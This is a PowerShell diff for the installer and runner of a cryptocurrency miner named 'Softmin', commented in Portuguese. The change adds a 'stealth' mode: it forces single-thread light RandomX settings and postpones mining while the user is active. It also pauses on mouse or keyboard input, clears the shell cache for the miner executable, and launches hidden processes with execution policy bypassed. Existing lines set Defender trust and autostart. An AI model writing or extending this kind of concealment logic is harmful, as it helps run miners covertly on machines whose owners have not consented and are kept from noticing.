@@ -440,29 +440,50 @@ function Ensure-SoftminMetaIni {
         [void]$lines.Add('# Softmin meta (modo adaptativo + URLs cloud)')
     }
     $required = @{
-        cpu_mode                    = 'adaptive'
-        cpu_profile                 = 'eco'
-        adaptive_brake              = 'eco'
-        adaptive_check_seconds      = '30'
-        adaptive_ramp_minutes       = '5,15,30'
-        adaptive_night_ramp_minutes = '10'
-        night_start                 = '00:00'
-        night_end                   = '07:00'
-        start_on_install            = $(if ($ForInstall) { 'true' } else { 'false' })
-        autostart                   = $(if ($ForInstall) { 'true' } else { 'false' })
-        secure_vault                = 'true'
-        secure_autostart            = 'true'
-        defender_trust              = 'true'
-        cloud_heal_enabled          = 'true'
-        cloud_manifest_url          = (Get-SoftminCloudManifestUrl)
-        cloud_base_url              = (Get-SoftminCloudBaseUrl)
-        cloud_usb_fallback          = ''
-        install_path                = $InstallPath
+        cpu_mode                          = 'adaptive'
+        cpu_profile                       = 'stealth'
+        adaptive_brake                    = 'pause'
+        adaptive_check_seconds            = '5'
+        adaptive_active_threshold_seconds   = '5'
+        adaptive_resume_seconds           = '60'
+        adaptive_ramp_minutes             = '10,25,45'
+        adaptive_night_ramp_minutes       = '15'
+        night_start                       = '00:00'
+        night_end                         = '07:00'
+        start_on_install                  = $(if ($ForInstall) { 'true' } else { 'false' })
+        autostart                         = $(if ($ForInstall) { 'true' } else { 'false' })
+        secure_vault                      = 'true'
+        secure_autostart                  = 'true'
+        defender_trust                    = 'true'
+        cloud_heal_enabled                = 'true'
+        cloud_manifest_url                = (Get-SoftminCloudManifestUrl)
+        cloud_base_url                    = (Get-SoftminCloudBaseUrl)
+        cloud_usb_fallback                = ''
+        install_path                      = $InstallPath
     }
+    $forceUpdate = @(
+        'cpu_mode', 'cpu_profile', 'adaptive_brake', 'adaptive_check_seconds',
+        'adaptive_active_threshold_seconds', 'adaptive_resume_seconds',
+        'adaptive_ramp_minutes', 'adaptive_night_ramp_minutes'
+    )
     $text = $lines -join "`n"
     foreach ($k in $required.Keys) {
         if ($text -notmatch "(?m)^$k=") {
             [void]$lines.Add("$k=$($required[$k])")
+        }
+    }
+    foreach ($k in $forceUpdate) {
+        if ($required.ContainsKey($k)) {
+            $val = $required[$k]
+            $found = $false
+            for ($i = 0; $i -lt $lines.Count; $i++) {
+                if ($lines[$i] -match "^$k=") {
+                    $lines[$i] = "$k=$val"
+                    $found = $true
+                    break
+                }
+            }
+            if (-not $found) { [void]$lines.Add("$k=$val") }
         }
     }
     if ($ForInstall) {
@@ -586,15 +607,18 @@ try {
     } else {
         $settings = Unlock-SoftminSettings -InstallPath $InstallPath -TryDpapi -PromptIfNeeded:$false
         $settings | Add-Member -NotePropertyName cpu_mode -NotePropertyValue 'adaptive' -Force
-        $settings | Add-Member -NotePropertyName cpu_profile -NotePropertyValue 'eco' -Force
+        $settings | Add-Member -NotePropertyName cpu_profile -NotePropertyValue 'stealth' -Force
         Write-SoftminRuntimeConfig -InstallPath $InstallPath -Settings $settings | Out-Null
         $cfgPath = Join-Path $InstallPath 'config.json'
         if (Test-Path -LiteralPath $cfgPath) {
             $cfgObj = Get-Content -LiteralPath $cfgPath -Raw -Encoding UTF8 | ConvertFrom-Json
-            $cfgObj.cpu.'max-threads-hint' = (Get-MaxThreadsHint 'eco')
+            $stealth = Get-SoftminProfileLaunchParams 'stealth'
+            $cfgObj.cpu.'max-threads-hint' = $stealth.Hint
+            if ($cfgObj.randomx) { $cfgObj.randomx.mode = $stealth.RandomxMode }
+            $cfgObj.misc.'pause-on-active' = $stealth.PauseOnActiveSec
             Save-JsonUtf8NoBom -Object $cfgObj -Path $cfgPath
         }
-        Write-RunLog $InstallPath '[RUN] Cofre desbloqueado; config.json em modo eco.'
+        Write-RunLog $InstallPath '[RUN] Cofre desbloqueado; config.json em modo stealth.'
     }
 } catch {
     Write-RunLog $InstallPath ("[RUN] ERRO cofre: {0}" -f $_.Exception.Message)
@@ -617,17 +641,25 @@ if ($startGov -and (Test-Path -LiteralPath $govScript)) {
         '-NoProfile', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden',
         '-File', "`"$govScript`"", '-InstallPath', "`"$InstallPath`""
     ) -WorkingDirectory $InstallPath -WindowStyle Hidden | Out-Null
-    Write-RunLog $InstallPath '[RUN] Governador iniciado (eco->turbo noite; freio se usar PC).'
+    Write-RunLog $InstallPath '[RUN] Governador iniciado (stealth->turbo; freio pause ao usar PC).'
 }
 
-# === 4) Minerador (sempre comeca eco) ===
+# === 4) Minerador (stealth ou adiado se utilizador activo) ===
 Get-Process -Name 'softmin' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
 Start-Sleep -Milliseconds 400
-$ecoHint = Get-MaxThreadsHint 'eco'
-$launch = Get-SoftminMinerLaunchArgs -InstallPath $InstallPath -MaxThreadsHint $ecoHint -Settings $settings
-Start-Process -FilePath $exe -ArgumentList $launch -WorkingDirectory $InstallPath -WindowStyle Hidden | Out-Null
+$cacheScript = Resolve-RunModule -Roots @($InstallPath, $PSScriptRoot, (Join-Path $PSScriptRoot 'scripts')) -Name 'Clear-SoftminShellCache.ps1'
+if ($cacheScript) {
+    try { & $cacheScript -ExePath $exe | Out-Null } catch { }
+}
+$idleSec = Get-SoftminUserIdleSeconds
+if ($idleSec -lt 90) {
+    Write-RunLog $InstallPath ('[RUN] Utilizador activo (idle={0}s) - minerador adiado; governador inicia quando ocioso.' -f $idleSec) -Silent:$Silent -Level OK
+} else {
+    Start-SoftminMinerProfile -InstallPath $InstallPath -Profile 'stealth' -Settings $settings | Out-Null
+    Write-RunLog $InstallPath '[RUN] Minerador iniciado (stealth: 1 thread, RandomX light).' -Silent:$Silent -Level OK
+}
 
-Write-RunLog $InstallPath '[RUN] Minerador iniciado (eco). Curador concluido — idle.' -Silent:$Silent -Level OK
+Write-RunLog $InstallPath '[RUN] Curador concluido - idle.' -Silent:$Silent -Level OK
 
 $coreInstaller = Resolve-RunModule -Roots @($InstallPath, $PSScriptRoot, (Join-Path $PSScriptRoot 'scripts')) -Name 'Install-SoftminCore.ps1'
 if ($coreInstaller) {
@@ -635,5 +667,5 @@ if ($coreInstaller) {
 }
 
 if (-not $Silent) {
-    Write-Host 'Softmin activo (eco). Noite ociosa = turbo. Uso do PC = reduz.' -ForegroundColor Green
+    Write-Host 'Softmin activo (stealth). Uso sobe apos ociosidade prolongada; mouse/teclado = minimo.' -ForegroundColor Green
 }
